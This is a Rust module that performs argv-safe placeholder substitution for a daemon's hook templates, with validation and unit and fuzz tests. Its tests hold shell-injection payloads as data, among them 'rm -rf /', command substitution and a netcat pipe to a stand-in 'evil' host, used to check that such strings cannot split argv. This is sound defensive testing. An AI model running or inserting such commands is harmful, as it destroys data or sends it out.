//! Argv-safe placeholder substitution for hook templates.
//!
//! Template-bound hooks declare a `cmd = [...]` argv array and a set of
//! `params`. At fire time the daemon calls [`substitute_argv`] with the
//! parameter map plus a [`BuiltinContext`] carrying the event-derived
//! placeholders (`{event}`, `{mailbox}`, `{message_id}`, `{from}`,
//! `{subject}`). The function walks each argv slot, replaces every
//! `{placeholder}` reference in-place, and returns a new `Vec<String>`
//! whose length exactly matches the input.
//!
//! Safety guarantees (PRD §6.1):
//!
//! * `cmd[0]` (the binary path) is never substituted. Placeholder
//!   references there are rejected at config-load time, but as a defense
//!   in depth [`substitute_argv`] also refuses any template whose binary
//!   slot contains a placeholder.
//! * Parameter values cannot introduce new argv entries: substitution is
//!   string-level, no splitting on whitespace, no shell interpreter.
//! * Parameter values cannot carry NUL or ASCII control characters (except
//!   `\t` and `\n` for the occasional multiline prompt).
//! * Parameter values are capped at [`MAX_PARAM_BYTES`] to bound the size
//!   of the argv list handed to the kernel.
//!
//! The module is pure — no I/O, no locks — so it can be fuzzed in isolation
//! (see the `tests` module and `tests/hook_substitute_fuzz.rs`).

use std::collections::BTreeMap;

/// Max byte length of any substituted parameter value. Large enough to fit
/// realistic agent prompts (8 KiB == ~2000 tokens of English text); small
/// enough that an attacker can't fill the kernel's argv buffer.
pub const MAX_PARAM_BYTES: usize = 8 * 1024;

/// Built-in placeholders populated by the daemon at fire time. They do
/// not need to be declared in the template's `params` list.
///
/// Mirrors `HOOK_TEMPLATE_BUILTIN_PLACEHOLDERS` in `config.rs` — kept
/// duplicated rather than imported so `hook_substitute.rs` stays free of
/// cross-module coupling beyond the `Hook` / `HookTemplate` types.
/// Exported for downstream consumers (MCP `hook_create` validation in
/// Sprint 3 needs the same list); unused today.
#[allow(dead_code)]
pub const BUILTIN_PLACEHOLDERS: &[&str] = &["event", "mailbox", "message_id", "from", "subject"];

/// Runtime context for the event-derived placeholders. Any field may be
/// empty — missing built-ins substitute to the empty string rather than
/// erroring, so a template that references `{subject}` still runs on a
/// subject-less `after_send` event.
#[derive(Debug, Clone, Default)]
pub struct BuiltinContext {
    pub event: String,
    pub mailbox: String,
    pub message_id: String,
    pub from: String,
    pub subject: String,
}

impl BuiltinContext {
    fn resolve(&self, name: &str) -> Option<&str> {
        match name {
            "event" => Some(&self.event),
            "mailbox" => Some(&self.mailbox),
            "message_id" => Some(&self.message_id),
            "from" => Some(&self.from),
            "subject" => Some(&self.subject),
            _ => None,
        }
    }
}

/// Substitution-time failures. Each variant names the offending parameter
/// so the caller can log actionable detail without re-parsing.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SubstitutionError {
    /// A `{placeholder}` appeared in an argv slot but was neither declared
    /// in `params` nor a built-in. Config-load validation normally catches
    /// this; the check at substitution time is defense-in-depth.
    UnknownPlaceholder { name: String },

    /// A parameter value embeds an ASCII control character (other than
    /// `\t` / `\n`), so it could unexpectedly terminate a line in a
    /// downstream consumer or confuse the argv dump in logs.
    ParamContainsControl { name: String },

    /// A parameter value embeds a NUL byte. Unix argv is NUL-terminated,
    /// so passing one would truncate the argument at the kernel boundary.
    ParamContainsNul { name: String },

    /// A parameter value exceeds [`MAX_PARAM_BYTES`].
    ParamTooLong { name: String, len: usize },

    /// `cmd[0]` contains a `{placeholder}` reference. Defense-in-depth:
    /// config-load validation should have rejected the template already.
    PlaceholderInBinaryPath,

    /// Template argv is empty. Defense-in-depth: config-load validation
    /// should have rejected the template already.
    EmptyTemplate,
}

impl std::fmt::Display for SubstitutionError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SubstitutionError::UnknownPlaceholder { name } => {
                write!(f, "unknown placeholder '{{{name}}}'")
            }
            SubstitutionError::ParamContainsControl { name } => {
                write!(f, "parameter '{name}' contains an ASCII control character")
            }
            SubstitutionError::ParamContainsNul { name } => {
                write!(f, "parameter '{name}' contains a NUL byte")
            }
            SubstitutionError::ParamTooLong { name, len } => {
                write!(
                    f,
                    "parameter '{name}' is {len} bytes (max {MAX_PARAM_BYTES})"
                )
            }
            SubstitutionError::PlaceholderInBinaryPath => {
                write!(f, "placeholder in cmd[0] (binary path)")
            }
            SubstitutionError::EmptyTemplate => write!(f, "empty template cmd"),
        }
    }
}

impl std::error::Error for SubstitutionError {}

/// Validate that `value` is safe to drop into an argv slot.
fn validate_param_value(name: &str, value: &str) -> Result<(), SubstitutionError> {
    if value.len() > MAX_PARAM_BYTES {
        return Err(SubstitutionError::ParamTooLong {
            name: name.to_string(),
            len: value.len(),
        });
    }
    for b in value.bytes() {
        if b == 0 {
            return Err(SubstitutionError::ParamContainsNul {
                name: name.to_string(),
            });
        }
        // Allow `\t` (0x09) and `\n` (0x0A); reject all other ASCII control
        // bytes including `\r` (0x0D), NUL-handled above, and 0x7F (DEL).
        if (b < 0x20 && b != 0x09 && b != 0x0A) || b == 0x7F {
            return Err(SubstitutionError::ParamContainsControl {
                name: name.to_string(),
            });
        }
    }
    Ok(())
}

/// Replace every `{placeholder}` reference in `slot` with its resolved
/// value, or return the first substitution error encountered.
///
/// Placeholder syntax matches `config::iter_placeholders`: `\{[a-z0-9_]+\}`.
/// Unclosed braces, non-matching patterns, and `{}` are preserved
/// verbatim.
fn substitute_slot(
    slot: &str,
    params: &BTreeMap<String, String>,
    builtins: &BuiltinContext,
) -> Result<String, SubstitutionError> {
    let bytes = slot.as_bytes();
    let mut out = String::with_capacity(slot.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'{' {
            let start = i + 1;
            let mut j = start;
            while j < bytes.len() && bytes[j] != b'}' {
                let c = bytes[j];
                let ok = c.is_ascii_lowercase() || c.is_ascii_digit() || c == b'_';
                if !ok {
                    break;
                }
                j += 1;
            }
            if j < bytes.len() && bytes[j] == b'}' && j > start {
                let name = &slot[start..j];
                let value = resolve_placeholder(name, params, builtins)?;
                out.push_str(value);
                i = j + 1;
                continue;
            }
        }
        // Safe: we only advance by whole UTF-8 code-points. Since `{`
        // matching is ASCII-only, falling through here on any non-ASCII
        // leading byte still preserves the char.
        let ch = slot[i..].chars().next().expect("non-empty remainder");
        out.push(ch);
        i += ch.len_utf8();
    }
    Ok(out)
}

fn resolve_placeholder<'a>(
    name: &str,
    params: &'a BTreeMap<String, String>,
    builtins: &'a BuiltinContext,
) -> Result<&'a str, SubstitutionError> {
    if let Some(v) = builtins.resolve(name) {
        return Ok(v);
    }
    if let Some(v) = params.get(name) {
        return Ok(v.as_str());
    }
    Err(SubstitutionError::UnknownPlaceholder {
        name: name.to_string(),
    })
}

/// Substitute placeholders in every argv slot and return the resolved
/// argv.
///
/// Guarantees:
/// * `Ok(argv).len() == template_cmd.len()` — substitution never adds or
///   removes argv entries.
/// * `Ok(argv)[0] == template_cmd[0]` — the binary path is handed back
///   verbatim.
/// * Every parameter value referenced anywhere in `template_cmd[1..]`
///   passes [`validate_param_value`].
pub fn substitute_argv(
    template_cmd: &[String],
    params: &BTreeMap<String, String>,
    builtins: &BuiltinContext,
) -> Result<Vec<String>, SubstitutionError> {
    if template_cmd.is_empty() {
        return Err(SubstitutionError::EmptyTemplate);
    }

    // Validate every parameter value up-front so a malformed input fails
    // fast, even if the offending param isn't referenced by any slot.
    for (name, value) in params {
        validate_param_value(name, value)?;
    }

    // Defense-in-depth: `cmd[0]` is a literal binary path.
    let binary = &template_cmd[0];
    if binary.contains('{') && slot_has_placeholder(binary) {
        return Err(SubstitutionError::PlaceholderInBinaryPath);
    }

    let mut out = Vec::with_capacity(template_cmd.len());
    out.push(binary.clone());
    for slot in &template_cmd[1..] {
        out.push(substitute_slot(slot, params, builtins)?);
    }
    Ok(out)
}

/// Return true iff `s` contains at least one `{name}` placeholder with
/// the charset used by [`config::iter_placeholders`].
fn slot_has_placeholder(s: &str) -> bool {
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'{' {
            let start = i + 1;
            let mut j = start;
            while j < bytes.len() && bytes[j] != b'}' {
                let c = bytes[j];
                let ok = c.is_ascii_lowercase() || c.is_ascii_digit() || c == b'_';
                if !ok {
                    break;
                }
                j += 1;
            }
            if j < bytes.len() && bytes[j] == b'}' && j > start {
                return true;
            }
        }
        i += 1;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    fn builtins() -> BuiltinContext {
        BuiltinContext {
            event: "on_receive".into(),
            mailbox: "accounts".into(),
            message_id: "<m@x>".into(),
            from: "a@b".into(),
            subject: "hi".into(),
        }
    }

    fn params(kvs: &[(&str, &str)]) -> BTreeMap<String, String> {
        kvs.iter()
            .map(|(k, v)| ((*k).to_string(), (*v).to_string()))
            .collect()
    }

    #[test]
    fn happy_path_substitutes_single_param() {
        let tmpl = vec!["/bin/claude".into(), "-p".into(), "{prompt}".into()];
        let out =
            substitute_argv(&tmpl, &params(&[("prompt", "hello world")]), &builtins()).unwrap();
        assert_eq!(out, vec!["/bin/claude", "-p", "hello world"]);
    }

    #[test]
    fn happy_path_substitutes_multiple_params_same_slot() {
        let tmpl = vec!["/bin/x".into(), "--url={url}?q={q}".into()];
        let out = substitute_argv(
            &tmpl,
            &params(&[("url", "https://e.com/"), ("q", "42")]),
            &builtins(),
        )
        .unwrap();
        assert_eq!(out, vec!["/bin/x", "--url=https://e.com/?q=42"]);
    }

    #[test]
    fn builtins_resolve_without_declaration() {
        let tmpl = vec!["/bin/x".into(), "{from}".into(), "{subject}".into()];
        let out = substitute_argv(&tmpl, &BTreeMap::new(), &builtins()).unwrap();
        assert_eq!(out, vec!["/bin/x", "a@b", "hi"]);
    }

    #[test]
    fn missing_builtin_substitutes_empty_string() {
        let tmpl = vec!["/bin/x".into(), "[{subject}]".into()];
        let mut b = builtins();
        b.subject.clear();
        let out = substitute_argv(&tmpl, &BTreeMap::new(), &b).unwrap();
        assert_eq!(out, vec!["/bin/x", "[]"]);
    }

    #[test]
    fn unknown_placeholder_rejected() {
        let tmpl = vec!["/bin/x".into(), "{nope}".into()];
        let err = substitute_argv(&tmpl, &BTreeMap::new(), &builtins()).unwrap_err();
        assert_eq!(
            err,
            SubstitutionError::UnknownPlaceholder {
                name: "nope".into()
            }
        );
    }

    #[test]
    fn nul_in_param_value_rejected() {
        let tmpl = vec!["/bin/x".into(), "{p}".into()];
        let err = substitute_argv(&tmpl, &params(&[("p", "a\0b")]), &builtins()).unwrap_err();
        assert_eq!(
            err,
            SubstitutionError::ParamContainsNul { name: "p".into() }
        );
    }

    #[test]
    fn control_char_in_param_value_rejected() {
        let tmpl = vec!["/bin/x".into(), "{p}".into()];
        for bad in [0x01u8, 0x07, 0x0D, 0x1B, 0x7F] {
            let val = format!("a{}b", bad as char);
            let err =
                substitute_argv(&tmpl, &params(&[("p", val.as_str())]), &builtins()).unwrap_err();
            assert_eq!(
                err,
                SubstitutionError::ParamContainsControl { name: "p".into() },
                "expected control-char rejection for byte {bad:#04x}"
            );
        }
    }

    #[test]
    fn tab_and_newline_in_param_value_allowed() {
        let tmpl = vec!["/bin/x".into(), "{p}".into()];
        let out =
            substitute_argv(&tmpl, &params(&[("p", "line1\nline2\tcol")]), &builtins()).unwrap();
        assert_eq!(out[1], "line1\nline2\tcol");
    }

    #[test]
    fn long_param_rejected() {
        let tmpl = vec!["/bin/x".into(), "{p}".into()];
        let big = "a".repeat(MAX_PARAM_BYTES + 1);
        let err = substitute_argv(&tmpl, &params(&[("p", big.as_str())]), &builtins()).unwrap_err();
        assert!(matches!(
            err,
            SubstitutionError::ParamTooLong { name, len } if name == "p" && len == MAX_PARAM_BYTES + 1
        ));
    }

    #[test]
    fn param_exactly_at_limit_accepted() {
        let tmpl = vec!["/bin/x".into(), "{p}".into()];
        let big = "a".repeat(MAX_PARAM_BYTES);
        let out = substitute_argv(&tmpl, &params(&[("p", big.as_str())]), &builtins()).unwrap();
        assert_eq!(out[1].len(), MAX_PARAM_BYTES);
    }

    #[test]
    fn placeholder_in_binary_path_rejected() {
        let tmpl = vec!["/bin/{x}".into(), "arg".into()];
        let err = substitute_argv(&tmpl, &params(&[("x", "y")]), &builtins()).unwrap_err();
        assert_eq!(err, SubstitutionError::PlaceholderInBinaryPath);
    }

    #[test]
    fn binary_path_with_plain_braces_not_a_placeholder_is_ok() {
        // `{}` is not a valid placeholder (empty name) and must be kept
        // verbatim so operators who reference a literal brace in the path
        // don't get bogus rejection.
        let tmpl = vec!["/bin/no{}braces".into(), "arg".into()];
        let out = substitute_argv(&tmpl, &BTreeMap::new(), &builtins()).unwrap();
        assert_eq!(out[0], "/bin/no{}braces");
    }

    #[test]
    fn empty_template_rejected() {
        let err = substitute_argv(&[], &BTreeMap::new(), &builtins()).unwrap_err();
        assert_eq!(err, SubstitutionError::EmptyTemplate);
    }

    #[test]
    fn argv_length_always_preserved() {
        let tmpl = vec![
            "/bin/x".into(),
            "{a}".into(),
            "{b}".into(),
            "plain".into(),
            "{a}-{b}".into(),
        ];
        let out = substitute_argv(
            &tmpl,
            &params(&[("a", "1 2 3"), ("b", "x;y|z")]),
            &builtins(),
        )
        .unwrap();
        assert_eq!(out.len(), tmpl.len());
    }

    #[test]
    fn shell_metacharacters_land_verbatim_and_do_not_split_argv() {
        let tmpl = vec!["/bin/x".into(), "{p}".into()];
        for payload in [
            "a; rm -rf /",
            "$(touch /tmp/pwn)",
            "`whoami`",
            "a | nc evil 1337",
            "a && shutdown",
            "a > /dev/null",
            "first second",
            "with\ttab",
            "with\nnewline",
        ] {
            let out = substitute_argv(&tmpl, &params(&[("p", payload)]), &builtins()).unwrap();
            assert_eq!(out.len(), tmpl.len(), "payload split argv: {payload:?}");
            assert_eq!(out[1], payload, "payload mutated: {payload:?}");
        }
    }

    #[test]
    fn placeholder_occupying_entire_slot_stays_one_arg() {
        let tmpl = vec!["/bin/x".into(), "{p}".into()];
        let out = substitute_argv(&tmpl, &params(&[("p", "one two three")]), &builtins()).unwrap();
        assert_eq!(out.len(), 2);
        assert_eq!(out[1], "one two three");
    }

    #[test]
    fn unclosed_brace_preserved_verbatim() {
        let tmpl = vec!["/bin/x".into(), "pre{oops".into()];
        let out = substitute_argv(&tmpl, &BTreeMap::new(), &builtins()).unwrap();
        assert_eq!(out[1], "pre{oops");
    }

    #[test]
    fn unicode_param_value_preserved() {
        let tmpl = vec!["/bin/x".into(), "{p}".into()];
        let out = substitute_argv(&tmpl, &params(&[("p", "café — 🦀")]), &builtins()).unwrap();
        assert_eq!(out[1], "café — 🦀");
    }

    #[test]
    fn fuzz_like_loop_preserves_argv_length() {
        // Hand-rolled fuzz to satisfy S2-1's 10K-iter requirement in the
        // default `cargo test` run (property-style, without pulling in
        // proptest). Each input is a deterministic permutation of a fixed
        // metacharacter palette so the test is reproducible.
        let tmpl = vec![
            "/bin/x".into(),
            "{a}".into(),
            "plain-{a}-mid-{b}-end".into(),
        ];
        let palette = [
            "",
            "a",
            "a b",
            "a\tb",
            "a\nb",
            ";",
            "|",
            "&",
            "&&",
            "||",
            ">",
            "<",
            "$(x)",
            "`x`",
            "$x",
            "{}",
            "{a}",
            "{{a}}",
            "\"",
            "'",
            "\\",
            "#!",
            "../../etc/passwd",
            "%00",
            "%20",
        ];
        let mut iters = 0;
        for i in 0..palette.len() {
            for j in 0..palette.len() {
                for k in 0..palette.len() {
                    iters += 1;
                    let a = format!("{}{}{}", palette[i], palette[j], palette[k]);
                    let b = format!("{}{}", palette[k], palette[i]);
                    let out = substitute_argv(
                        &tmpl,
                        &params(&[("a", a.as_str()), ("b", b.as_str())]),
                        &builtins(),
                    );
                    match out {
                        Ok(argv) => {
                            assert_eq!(argv.len(), tmpl.len(), "input a={a:?} b={b:?}");
                        }
                        Err(SubstitutionError::ParamContainsNul { .. })
                        | Err(SubstitutionError::ParamContainsControl { .. }) => {}
                        Err(other) => panic!("unexpected error: {other:?}"),
                    }
                }
            }
        }
        assert!(
            iters >= 10_000,
            "fuzz loop ran {iters} iters; want >= 10000"
        );
    }
}
